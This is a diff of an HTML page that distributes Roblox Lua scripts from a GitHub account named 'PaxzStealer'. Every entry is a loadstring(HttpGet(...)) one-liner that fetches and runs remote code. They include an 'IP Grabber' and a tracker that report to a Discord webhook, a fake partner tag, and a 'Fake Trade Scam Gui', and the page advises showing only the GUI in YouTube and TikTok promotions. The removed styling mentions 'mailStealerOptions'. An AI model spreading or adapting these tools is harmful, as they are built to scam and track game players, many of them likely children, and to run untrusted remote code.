@@ -29,30 +29,15 @@
       font-size: 30px;
       margin-bottom: 20px;
     }
-    button {
-      padding: 10px 20px;
-      font-size: 18px;
-      margin: 10px;
-      background-color: #3498db;
-      color: #fff;
-      border: none;
+    pre {
+      background-color: #282c34;
+      padding: 10px;
       border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease-in-out;
+      overflow-x: auto;
     }
-    button:hover {
-      background-color: #2980b9;
-    }
-    #mailStealerOptions {
-      display: none;
-      margin-top: 20px;
-    }
-    #mailStealerOptions button {
-      background-color: #e74c3c;
-      transition: background-color 0.3s ease-in-out;
-    }
-    #mailStealerOptions button:hover {
-      background-color: #c0392b;
+    pre code {
+      color: #fff;
+      white-space: pre-wrap;
     }
   </style>
 </head>
@@ -62,35 +47,63 @@
   <h1>Other scripts</h1>
 
   <h2>Paxz Visual Script:</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Visual.lua", true))()<br>Key: Paxz</p>
+  <pre><code>
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Visual.lua", true))()
+  </code></pre>
+  <p>Key: Paxz</p>
 
   <h2>Paxz Gem Spoofer!</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Gem-Spoofer", true))()</p>
+  <pre><code>
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Gem-Spoofer", true))()
+  </code></pre>
 
   <h2>Paxz - Gem Tracker</h2>
-  <p>_G.Webhook = "" -- Your Discord webhook<br>_G.Update = 10  -- Convert to a number, not a string<br>_G.EmbedColor = 0x800080  -- Purple color in hexadecimal<br>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzGemTracker.lua", true))()</p>
+  <pre><code>
+    _G.Webhook = "" -- Your Discord webhook
+    _G.Update = 10  -- Convert to a number, not a string
+    _G.EmbedColor = 0x800080  -- Purple color in hexadecimal
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzGemTracker.lua", true))()
+  </code></pre>
 
   <h2>Paxz IP Grabber</h2>
-  <p>_G.Webhook = "" --// Your webhook for the messages<br>_G.Troll = false --// funny things will happen so set it to true :)<br>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/IP%20Grabber", true))()</p>
+  <pre><code>
+    _G.Webhook = "" --// Your webhook for the messages
+    _G.Troll = false --// funny things will happen so set it to true :)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/IP%20Grabber", true))()
+  </code></pre>
 
   <h2>Paxz - My Restaurant</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/My%20Restourant", true))()<br>Key: PaxzOnTop</p>
+  <pre><code>
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/My%20Restourant", true))()
+  </code></pre>
+  <p>Key: PaxzOnTop</p>
 
   <h2>Paxz - Auto Yeet</h2>
-  <p>_G.AutoYeet = true -- set true to turn on false to turn off<br>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Auto-Yeet", true))()</p>
+  <pre><code>
+    _G.AutoYeet = true -- set true to turn on false to turn off
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Auto-Yeet", true))()
+  </code></pre>
 
   <h2>Paxz Fake Partner Tag</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/FakeTag"))()</p>
+  <pre><code>
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/FakeTag"))()
+  </code></pre>
 
   <h2>Paxz Auto Farm</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Auto-Farm", true))()</p>
+  <pre><code>
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Auto-Farm", true))()
+  </code></pre>
 
   <h2>Paxz Fake Trade Scam Gui</h2>
-  <p>_G.ScriptTitle = "" --// The title of your Gui<br>_G.ScriptCredits = "" --// put here something like made by (your name)<br>
-  _G.KeySystem = false --// set to true for keysystem (if not dont touch anything from the Key System)<br>
-  _G.TitleKeySystem = "" --// Title for your keysystem<br>_G.Key = "" --// the key for your key system<br>
-  _G.KeySystemNote = "" --// Note for your key system<br>
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Fake-TradeScam-Gui", true))()</p>
+  <pre><code>
+    _G.ScriptTitle = "" --// The title of your Gui
+    _G.ScriptCredits = "" --// put here something like made by (your name)
+    _G.KeySystem = false --// set to true for keysystem (if not dont touch anything from the Key System)
+    _G.TitleKeySystem = "" --// Title for your keysystem
+    _G.Key = "" --// the key for your key system
+    _G.KeySystemNote = "" --// Note for your key system
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Fake-TradeScam-Gui", true))()
+  </code></pre>
   
   <p>This is for Advertise on Youtube, Tiktok, etc.<br>
   This is what you can show in your video, not the script but the GUI.<br>
